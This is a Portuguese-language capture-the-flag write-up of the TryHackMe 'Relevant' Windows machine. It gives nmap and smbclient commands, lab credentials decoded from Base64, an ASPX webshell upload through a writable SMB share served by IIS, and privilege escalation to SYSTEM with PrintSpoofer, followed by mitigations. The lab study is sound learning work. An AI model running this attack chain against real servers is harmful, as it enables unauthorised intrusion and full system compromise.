# 📄 RELATÓRIO TÉCNICO – CTF RELEVANT (TryHackMe)

👤 **Autor:** c0rt3s
🎯 **Plataforma:** TryHackMe
🖥️ **Máquina:** Relevant
📌 **Tipo:** CTF – Windows / SMB / IIS / Privilege Escalation
⚙️ **Objetivo:** Obter as flags da máquina
📊 **Nível de dificuldade:** Médio
🧠 **Base de estudo:** Conteúdo e metodologia do curso da Desec Security

---

# 🎯 Objetivo do Lab

O objetivo deste laboratório foi comprometer a máquina *Relevant* da plataforma TryHackMe e obter as flags presentes no sistema, aplicando técnicas de enumeração SMB, análise de credenciais, exploração de execução remota via IIS e escalonamento de privilégios em ambiente Windows.

A máquina foi utilizada como forma de consolidar conhecimentos práticos sobre vetores comuns de exploração em ambientes Windows corporativos.

---

# ⚔️ Resumo da Cadeia de Ataque

A exploração da máquina seguiu o seguinte fluxo:

```
Enumeração de portas
        ↓
Enumeração SMB
        ↓
Acesso a share com permissão de escrita
        ↓
Descoberta de credenciais em Base64
        ↓
Autenticação SMB
        ↓
Upload de arquivo ASPX
        ↓
Execução via IIS
        ↓
Reverse shell
        ↓
Enumeração de privilégios
        ↓
Exploração SeImpersonatePrivilege (PrintSpoofer)
        ↓
Acesso SYSTEM
        ↓
Captura das flags
```

Esse fluxo representa uma **kill chain clássica em ambientes Windows com integração insegura entre SMB e IIS**.

---

# 🔍 Reconhecimento Inicial – Enumeração de Portas

O primeiro passo foi identificar os serviços expostos utilizando **Nmap**:

```
nmap -sS -Pn -n -p- --reason relevant.thm
nmap -sC -sV -p80,135,139,445,3389,49663,49666,49667 relevant.thm
nmap -v -A -p80,135,139,445,3389,49663,49666,49667 relevant.thm
```
OBS: após rodar o nmap -v -A ele mostrou que existia dois IIS

Serviços identificados:

* 80/tcp    HTTP      Microsoft IIS 10.0
* 135/tcp   MSRPC
* 139/tcp   NetBIOS
* 445/tcp   SMB       Windows Server 2016
* 3389/tcp  RDP
* 49663/tcp HTTP      Microsoft IIS 10.0
* 49666/tcp RPC
* 49667/tcp RPC

A presença de **dois serviços IIS** chamou atenção, indicando possível superfície adicional de ataque.

---

# 📂 Enumeração SMB

Foi realizada enumeração de shares SMB:

```
smbclient -L //relevant.thm/
```

Share identificado:

```
nt4wrksv
```

Acesso ao share:

```
smbclient //relevant.thm/nt4wrksv
```

Arquivo encontrado:

```
passwords.txt
```

Conteúdo:

```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
```

---

# 🔓 Decodificação de Credenciais

O conteúdo foi identificado como Base64:

```
echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d
```

Resultado:

```
Bob - !P@$$W0rD!123
```

Credenciais válidas obtidas:

* Usuário: **Bob**
* Senha: **!P@$$W0rD!123**

---

# 🧨 Descoberta Crítica – Integração SMB + IIS

Após autenticação, foi identificado que o share permitia **upload de arquivos**.

Teste realizado:

```
put test.aspx
```

Ao acessar:

```
http://relevant.thm:49663/nt4wrksv/test.aspx
```

Foi confirmado que o diretório SMB estava **diretamente exposto pelo IIS**.

Fluxo identificado:

```
SMB Upload
        ↓
Arquivo salvo no sistema
        ↓
IIS executa o arquivo
        ↓
Execução remota de código
```

Isso caracteriza uma falha crítica de configuração.

---

# 🐚 Exploração – Remote Code Execution (RCE)

Foi realizado upload de uma webshell ASPX:

```
shell.aspx
```

Execução via navegador:

```
http://relevant.thm:49663/nt4wrksv/shell.aspx
```

A webshell permitiu execução de comandos no sistema.

Posteriormente foi obtida uma **reverse shell**, garantindo acesso interativo ao servidor.

---

# 🔎 Enumeração do Sistema

Após acesso inicial, foi executado:

```
whoami /priv
```

Foi identificado o privilégio:

```
SeImpersonatePrivilege (Enabled)
```

Esse privilégio é conhecido por permitir **escalonamento de privilégios em sistemas Windows**.

---

# 🚀 Escalonamento de Privilégio

## 🔥 Vulnerabilidade Explorável

O usuário comprometido possuía o privilégio:

```
SeImpersonatePrivilege
```

Esse privilégio permite que um processo **se passe por outro usuário após autenticação**, sendo frequentemente explorado para obter acesso SYSTEM.

---

## ⚙️ Exploração com PrintSpoofer

Foi utilizado o exploit:

```
PrintSpoofer
```

O ataque funciona explorando o serviço:

```
Print Spooler
```

Fluxo da exploração:

```
Criação de Named Pipe malicioso
        ↓
Serviço Print Spooler (SYSTEM) conecta
        ↓
Captura do token SYSTEM
        ↓
Impersonação via SeImpersonatePrivilege
        ↓
Execução de processo como SYSTEM
```

Execução:

```
PrintSpoofer.exe -i -c cmd
```

---

# 🔓 Acesso SYSTEM e Captura das Flags

Após execução do exploit:

```
whoami
```

Resultado:

```
nt authority\system
```

Flags obtidas:

**User Flag**

```
C:\Users\Bob\Desktop\user.txt
```

**Root Flag**

```
C:\Users\Administrator\Desktop\root.txt
```

---

# 💥 Impacto de Segurança

Em um ambiente real, essa vulnerabilidade permitiria:

* Execução remota de código via IIS
* Acesso a arquivos internos via SMB
* Escalonamento de privilégios até SYSTEM
* Comprometimento total do servidor

---

# 🛡️ Mitigações Recomendadas

* Remover permissões de escrita desnecessárias em shares SMB
* Não expor diretórios SMB diretamente via IIS
* Não armazenar credenciais em arquivos acessíveis
* Restringir privilégios de contas de serviço
* Desabilitar privilégios como SeImpersonatePrivilege quando não necessários
* Monitorar atividades suspeitas em serviços SMB e IIS

---

# 🧠 Conclusão

Este laboratório demonstrou uma cadeia de ataque realista em ambientes Windows, explorando falhas comuns de configuração e privilégios excessivos.

Principais pontos explorados:

* Integração insegura entre SMB e IIS
* Armazenamento inadequado de credenciais
* Execução remota de código via upload de arquivos
* Escalonamento de privilégios utilizando SeImpersonatePrivilege

A exploração bem-sucedida reforça a importância de práticas seguras de configuração e validação contínua de permissões em ambientes corporativos.

---
